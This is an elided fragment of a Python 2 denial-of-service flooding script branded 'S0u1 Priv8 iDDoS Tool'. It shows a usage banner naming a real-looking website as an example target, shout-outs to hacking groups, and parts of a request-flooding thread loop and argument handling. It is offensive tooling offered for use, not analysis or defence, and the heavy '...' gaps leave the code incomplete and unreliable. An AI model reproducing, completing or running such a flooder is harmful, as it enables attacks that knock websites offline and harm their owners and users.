...
def usage():
	print 'S0u1 Priv8 iDDoS Tool ( individual Dangerous Denial of Service )'
	print 'HLoTW Facebook: https://www.facebook.com/HLoTW/'
	print 'New loaded Anonymous User Agents Rooted By one and only (S0u1) '
	print 'Usage: S0u1(url)'
	print 'Example: S0u1.py http://luthi.co.il/'
	print "\a"
print \
"""
                                 HLoTW
...
//                                              
    ...
    | /  ,'      ~~>Created By S0u1<~~
    |/,-'      ---->ACII Art by : S0u1<----
    '     Command are below add HTTP no HTTPS :P
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
			print "----->>> S0u1s attack started Sended <<<-----"
			code=500
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				previous=request_counter
		if flag==2:
			print "\n-- Sending mass amout of User Strings :P by S0u1 --"
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "S0u1's Priv8 DDoSer Only for HLoTW members and LulzSec Members :D"
		print "Created By S0u1 :P "
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
